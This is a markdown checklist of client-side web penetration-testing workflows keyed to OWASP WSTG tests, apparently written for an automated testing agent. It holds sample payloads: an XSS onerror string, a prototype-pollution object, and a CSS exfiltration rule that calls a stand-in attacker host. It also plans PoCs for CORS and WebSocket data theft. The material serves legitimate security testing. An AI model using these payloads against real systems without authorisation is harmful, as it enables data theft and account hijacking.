# Workflows

# Client-Side Advanced Workflows

## CORS misconfiguration testing (WSTG-CLNT-07)

- corscanner_scan: url target, verbose True
- Manual verification with curl_cors_test:
  - Test reflected origin: send `Origin: https://attacker.com`, check ACAO reflects it
  - Test null origin: send `Origin: null`, check ACAO allows null
  - Test subdomain wildcard: send `Origin: https://evil.target.com`
  - Test with credentials: verify ACAC: true paired with specific origin (not wildcard)
- cors_poc_generate: build HTML PoC demonstrating data theft via cross-origin fetch

## WebSocket security testing (WSTG-CLNT-10)

- websocket_client_connect: url target, origin "https://attacker.com"
- test_vectors:
  - Missing origin validation: connect from arbitrary origin, observe if accepted
  - CSWSH: connect with victim's cookies from attacker page via cswsh_poc_generate
  - Message injection: send XSS payloads, SQLi strings through WS messages
  - Auth bypass: connect to WS endpoint without auth token, test if messages accepted

## Clickjacking testing (WSTG-CLNT-09)

- clickjack_test: url target, check_headers True, check_csp True
- test_vectors:
  - Missing X-Frame-Options: embed target in iframe, verify rendering
  - CSP frame-ancestors missing: check CSP header for frame-ancestors directive
  - Multi-step clickjacking: chain multiple clicks via positioned iframes
  - Drag-and-drop hijacking: use HTML5 drag events to extract data from framed page
- clickjack_poc_generate: build PoC with transparent overlay on sensitive action

## postMessage abuse (WSTG-CLNT-11)

- postmessage_scanner: url target, headless True
- test_vectors:
  - Missing origin check: handler uses `event.data` without verifying `event.origin`
  - DOM manipulation: send `{action: "update", html: "<img src=x onerror=alert(1)>"}` via postMessage
  - Prototype pollution: send `{__proto__: {isAdmin: true}}` through message handler
- postmessage_poc_generate: build PoC page that opens target and sends crafted messages

## CSS injection (WSTG-CLNT-05)

- css_inject_test: url target, param "style"
- test_vectors:
  - Attribute selector exfil: `input[value^="a"]{background:url(https://attacker/a)}`
  - CSS keylogger: attribute selectors on each character for input fields
  - UI manipulation: inject `position:absolute;z-index:9999` to overlay fake login form
- Exfiltration technique: generate CSS rules for each character, observe HTTP callbacks

## Client-side storage (WSTG-CLNT-06)

- storage_inspector: url target, headless True
- service_worker_audit: url target, headless True
- test_vectors:
  - localStorage tokens: check for JWT, session tokens, API keys in localStorage
  - IndexedDB sensitive data: inspect for PII, credentials, cached API responses
  - Service worker cache: check for sensitive responses cached by service worker
  - Cookie vs storage: compare what's in cookies vs localStorage for security-sensitive data

## Reporting and validation

- Build standalone HTML PoC for each confirmed vulnerability
- Document: attack origin requirements, user interaction needed, data accessible
- Classify severity: CORS data theft (High), CSWSH (High), clickjacking (Medium), storage exposure (Medium)
